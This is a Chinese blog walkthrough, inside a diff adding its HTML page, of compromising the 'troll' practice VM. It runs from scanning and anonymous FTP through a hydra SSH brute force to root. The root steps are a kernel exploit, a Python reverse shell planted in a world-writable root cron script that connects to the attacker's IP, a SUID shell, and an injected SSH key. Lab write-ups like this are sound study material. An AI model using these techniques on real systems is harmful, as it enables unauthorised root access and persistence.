@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="第四个靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="troll">
+<meta property="og:url" content="http://example.com/2026/03/01/troll/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="第四个靶机">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yk.jsdu.cn/20260302/fb9aaca4487480e483c7243a09fc51f8.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260302/92849c05b035c0de0b743552ef96566b.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260302/7131b735a8f1cd6a1753d8c1553db4b0.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260302/a8b373ee7a60d321c6689913f39f4d3e.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260303/97a0cbe26782f81237368390416d8b2c.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260303/4f2d8c03eb9eb9ec6b1e49df23d72ffe.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260303/93ff60322adcc1212ea85aa7723387bb.png">
+<meta property="og:image" content="https://origin.picgo.net/2026/03/03/troll85be4230c3f31b728.png">
+<meta property="article:published_time" content="2026-03-01T07:30:52.000Z">
+<meta property="article:modified_time" content="2026-03-03T06:27:28.534Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="渗透靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yk.jsdu.cn/20260302/fb9aaca4487480e483c7243a09fc51f8.png">
+
+
+<link rel="canonical" href="http://example.com/2026/03/01/troll/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/03/01/troll/","path":"2026/03/01/troll/","title":"troll"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>troll | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="nav-number">2.1.</span> <span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.</span> <span class="nav-text">定时任务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.2.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8Croot-shell"><span class="nav-number">2.2.2.</span> <span class="nav-text">运行root shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="nav-number">2.2.3.</span> <span class="nav-text">写ssh公钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81"><span class="nav-number">2.3.</span> <span class="nav-text">验证</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">109</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/01/troll/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="troll | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          troll
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-01 15:30:52" itemprop="dateCreated datePublished" datetime="2026-03-01T15:30:52+08:00">2026-03-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-03 14:27:28" itemprop="dateModified" datetime="2026-03-03T14:27:28+08:00">2026-03-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>第四个靶机</p>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>前期依然是信息收集，先找到靶机的IP，这里对应的是<code>192.168.4.133</code>，接下来是端口扫描：<code>nmap -p- 192.168.4.133</code>，扫描发现存在<code>21/22/80</code>对应 ftp服务、ssh服务、web服务。</p>
+<p>这里最开始探测端口信息用的是<code>nmap -p- -sV 192.168.4.133 </code>，输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nmap -p- -sV 192.168.4.133        </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2026-03-02 02:34 EST</span><br><span class="line">Nmap scan report for 192.168.4.133</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:A8:64:71 (VMware)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds</span><br></pre></td></tr></table></figure>
+
+<p>基本上只探测出来了版本，这里一开始看到vsftpd版本上网搜了下，没找到什么可以很好利用的poc，因为还没有登录进去。</p>
+<p>但是如果换一种探测命令<code>nmap -p- -sV -sS -A 192.168.4.133</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2026-03-02 02:42 EST</span><br><span class="line">Nmap scan report for 192.168.4.133</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.4.130</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 600</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)</span><br><span class="line">|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)</span><br><span class="line">|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)</span><br><span class="line">|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/secret</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:A8:64:71 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.31 ms 192.168.4.133</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>探测出来的信息更多。并且通过上面可以直接发现<code>ftp</code>可以用<code>Anonymous</code>登进去，密码是空，尝试登录，发现直接就登录进去了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# ftp 192.168.4.133</span><br><span class="line">Connected to 192.168.4.133.</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">Name (192.168.4.133:kali): Anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
+
+<p>登录上去之后<code>ls</code>可以发现存在<code>lol.pcap</code> ，直接<code>get lol.pcap</code>  就可以下载到kali的桌面上了，用<code>wireshark</code>打开追踪一下TCP流可以发现：</p>
+<p><img src="https://yk.jsdu.cn/20260302/fb9aaca4487480e483c7243a09fc51f8.png" alt="troll1"></p>
+<p><code>sup3rs3cr3tdirlol</code> 看上去像是一个密码，但其实是一个目录，访问<code>http://192.168.4.133/sup3rs3cr3tdirlol/</code>可以下载到一个ELF可执行文件。拖到<code>kali</code>里面分别用<code>exiftool、binwalk、strings</code>分别找一下信息，通过<code>strings</code>可以发现一段有用的信息：<code>Find address 0x0856BF to proceed</code>，这个其实也是一个目录，笑。</p>
+<p>所以算是脑洞还是算真实应用场景会出现的情况？不过什么都尝试一下是正确的。比如前面的<code>sup3rs3cr3tdirlol</code>第一眼看上去更像是密码。访问<code>http://192.168.4.133/0x0856BF</code>，给了两个文件夹，两个文件夹里面都有<code>txt</code>信息，很容易让人联想到一个是用户名，一个是密码，但是这里比较搞人的事是密码是<code>Pass.txt</code>而不是里面的内容。用<code>hydra</code>爆破一下：<code>hydra -L username.txt -p Pass.txt 192.168.4.133 -s 22 ssh</code></p>
+<p><img src="https://yk.jsdu.cn/20260302/92849c05b035c0de0b743552ef96566b.png" alt="troll2"></p>
+<p>爆破出来的ssh账号密码为:<code>overflow/Pass.txt</code>；直接ssh登录上去 <code>ssh@overflow 192.168.4.133</code>，拿到的权限是普通用户的权限<code>overflow</code>，所以依然是需要提权，<code>uname -a</code> 发现内核信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">overflow@troll:/$ uname -a</span><br><span class="line">Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 athlon i686 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<p>版本是<code>3.13.0</code>，kali搜一下相关内核漏洞：<code>searchsploit Linux Ubuntu 3.13.0</code>，发现存在两个可以利用的：</p>
+<p><img src="https://yk.jsdu.cn/20260302/7131b735a8f1cd6a1753d8c1553db4b0.png" alt="troll3"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>把37292.c文件cp到桌面上也可以看到使用说明，直接<code>gcc 37292.c -o ofs;./ofs</code>即可，直接就内核提权了。</p>
+<p><img src="https://yk.jsdu.cn/20260302/a8b373ee7a60d321c6689913f39f4d3e.png" alt="troll4"></p>
+<h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>渗透的过程中可以发现存在每过几分钟ssh就断开连接的情况，怀疑是定时任务。通过<code>find / -name &quot;*cron*&quot; 2&gt;/dev/null</code> 来全局模糊查询一下带有cron字符的文件及目录：</p>
+<p><img src="https://yk.jsdu.cn/20260303/97a0cbe26782f81237368390416d8b2c.png" alt="troll5"></p>
+<table>
+<thead>
+<tr>
+<th><strong>特性</strong></th>
+<th><strong>&#x2F;etc&#x2F;crontab</strong></th>
+<th><strong>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;</strong></th>
+<th><strong>&#x2F;var&#x2F;log&#x2F;cronlog</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>角色</strong></td>
+<td><strong>系统级</strong>定时任务文件</td>
+<td><strong>用户级</strong>定时任务目录</td>
+<td><strong>日志文件</strong></td>
+</tr>
+<tr>
+<td><strong>所有者</strong></td>
+<td>Root 专用</td>
+<td>对应各个用户</td>
+<td>系统日志服务</td>
+</tr>
+<tr>
+<td><strong>格式内容</strong></td>
+<td>包含“用户名”字段（指定谁运行）</td>
+<td>不包含用户名（隐含为文件所属者）</td>
+<td>记录任务执行的时间、用户、命令</td>
+</tr>
+<tr>
+<td><strong>编辑方式</strong></td>
+<td>直接使用 <code>vi</code> 或 <code>nano</code> 编辑</td>
+<td>必须使用 <code>crontab -e</code> 命令</td>
+<td>仅供读取（需 root 权限）</td>
+</tr>
+<tr>
+<td><strong>渗透价值</strong></td>
+<td><strong>极高</strong>：常有 root 权限运行的任务</td>
+<td><strong>中</strong>：可查看&#x2F;修改普通用户的私有任务</td>
+<td><strong>高</strong>：发现隐藏的脚本运行频率</td>
+</tr>
+</tbody></table>
+<p>查看这个日志文件： <code>cat  /var/log/cronlog</code> 可以发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/log/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p>发现存在<code>cleaner.py</code>文件，我们可以全局搜索一下这个文件的位置：<code>find / -name cleaner.py 2&gt;/dev/null</code> ，发现是存在于 <code>/lib/log/cleaner.py</code> ，查看一下python文件的内容，很简单的几行代码，就是删除<code>/tmp</code>下的所有文件。</p>
+<p>我们查看一下<code>cleaner.py</code>的权限:<code>ls -la /lib/log/cleaner.py</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /lib/log/cleaner.py</span><br><span class="line">-rwxrwxrwx 1 root root 334 Mar  2 17:42 /lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>所有用户都可以对它读写执行。那么现在有个思路很清晰了，就是可以改<code>cleaner.py</code>的内容，搞一个反弹shell，如果是以root用户权限来执行的python文件，就可以拿到root权限了。所以我们可以改一下<code>cleaner.py</code>文件的内容，这里不能直接通过<code>vim</code>改，用的是<code>nano</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def con():</span><br><span class="line">        import socket, time,pty, os</span><br><span class="line">        host=&#x27;192.168.4.130&#x27;</span><br><span class="line">        port=9999</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(10)</span><br><span class="line">        s.connect((host,port))</span><br><span class="line">        os.dup2(s.fileno(),0)</span><br><span class="line">        os.dup2(s.fileno(),1)</span><br><span class="line">        os.dup2(s.fileno(),2)</span><br><span class="line">        os.putenv(&quot;HISTFILE&quot;,&#x27;/dev/null&#x27;)</span><br><span class="line">        pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">        s.close()</span><br><span class="line">con()</span><br></pre></td></tr></table></figure>
+
+<p>然后在kali上面进行监听，过一会儿，就可以发现拿到root权限了，反过来说明这个cleaner.py确实是以root权限运行的。</p>
+<p><img src="https://yk.jsdu.cn/20260303/4f2d8c03eb9eb9ec6b1e49df23d72ffe.png" alt="troll6"></p>
+<h3 id="运行root-shell"><a href="#运行root-shell" class="headerlink" title="运行root shell"></a>运行root shell</h3><p>将<code>cleaner.py</code>的内容修改为<code>os.system(&#39;cp /bin/sh  /tmp/test&#39;)  os.system(&#39;chmod u+s /tmp/test&#39;)</code> ；一开始我是直接想通过<code>os.system(&quot;/bin/bash&quot;)</code>来开启一个shell。这样是不行的，虽然成功执行了这个命令，也产生了一个进程，但是不能交互啊，这个进程都不知道自己的输出和输入在那，不会返回到我们的kali上面来。</p>
+<p>所以就换一种方式嘛。linux 一切皆文件，命令也是文件，直接以root权限把 &#x2F;bin&#x2F;sh 弄到 &#x2F;tmp目录下面。然后再给它赋予u+s，那么就是说所有用户运行这个文件的时候，都是以文件所有者的身份来运行，而这个文件所有者又是一开始通过root搞过去的，所以就提权了，具体方式如下：</p>
+<p><img src="https://yk.jsdu.cn/20260303/93ff60322adcc1212ea85aa7723387bb.png" alt="troll7"></p>
+<p>可以发现成功提权到root了。</p>
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>利用<code>cleaner.py</code>文件往<code>/root/.ssh/authorized_keys</code>文件写公钥，然后连过去。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;mkdir /root/.ssh;chmod 775 /root/.ssh;echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII1JGR4Ywmhs9Y07GAL1cPGDom0HLhayh4Z/8gmrmED8 kali@kali&quot; &gt;&gt;/root/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在<code>kali</code>上面利用<code>ssh-keygen </code>来生成公私钥对，一路回车即可。默认都是放在<code>~/.ssh</code> 下面的。 生成的xx.pub这个公钥的内容就是我们要往authorized_keys写的内容，如上所示。写完之后，等个2分钟执行完就可以ssh连接过去了</p>
+<p><img src="https://origin.picgo.net/2026/03/03/troll85be4230c3f31b728.png" alt="troll8"></p>
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>回过头看，看看定时任务到底写了个啥，现在我们已经是以root的权限上去了，可以肆无忌惮的看文件内容了：我们看一下<code>/var/spool/cron/crontabs/root</code>的内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*/<span class="number">5</span> * * * * /usr/<span class="built_in">bin</span>/python /opt/lmao.py</span><br><span class="line">*/<span class="number">2</span> * * * * /usr/<span class="built_in">bin</span>/python /lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
+
+<p>果然是执行了cleaner.py，当然还有一个文件<code>/opt/lmao.py</code>我们也可以看一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;echo &quot;TIMES UP LOL!&quot;|wall&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&quot;pkill -u &#x27;overflow&#x27;&quot;</span>)</span><br><span class="line">sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>会直接退出overflow账号的登录。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA/" rel="tag"># 渗透靶机</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/27/Raven2/" rel="prev" title="Raven2">
+                  <i class="fa fa-angle-left"></i> Raven2
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
